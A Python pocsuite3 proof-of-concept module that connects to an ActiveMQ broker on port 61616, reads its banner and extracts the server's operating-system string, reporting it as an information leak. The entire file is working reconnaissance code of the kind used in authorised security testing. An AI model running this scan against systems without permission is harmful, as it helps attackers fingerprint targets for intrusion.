# -*- coding: utf-8 -*-
# author: seven
from pocsuite3.api import register_poc, POCBase, Output,logger,POC_CATEGORY
from pocsuite3.lib.core.threads import run_threads
import socket
import re

def connect(host,port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host,int(port)))
        info = s.recv(4096)
        info = info.decode('utf-8','ignore')
        logger.info(info)
        if 'OS:' in info:
            logger.info(info)
            match = re.findall(r'OS:(.*?)\x00',info)
            if len(match) > 0:
                return match[0]
    except Exception as e:
        raise Exception(f'{host}:{port}\t{str(e)}')
        
    raise Exception(f'{host}:{port}\tGET OS INFO FAIL')

class ActiveMQInfoLeakPOC(POCBase):
    vulID = ''
    version = '1.0'
    author = ['seven']
    vulDate = 'Aug 8, 2020'
    createDate = 'Aug 8, 2020'
    name = 'activemq信息泄露'
    appName = 'activemq'
    appVersion = 'v1.0.0'
    vulType = '信息泄露'
    protocol = 'activemq'

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    def _verify(self):
        host = self.getg_option("rhost")
        port = self.getg_option("rport") or 61616   

        result = {}
        try:
            sysinfo = connect(host,int(port))
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = '{}:{}'.format(host,port)
            result['extra'] = sysinfo.strip()
        except Exception as e:
            logger.info(str(e))
            
        return self.parse_output(result)
    def _attack(self):
        return self._verify()

register_poc(ActiveMQInfoLeakPOC)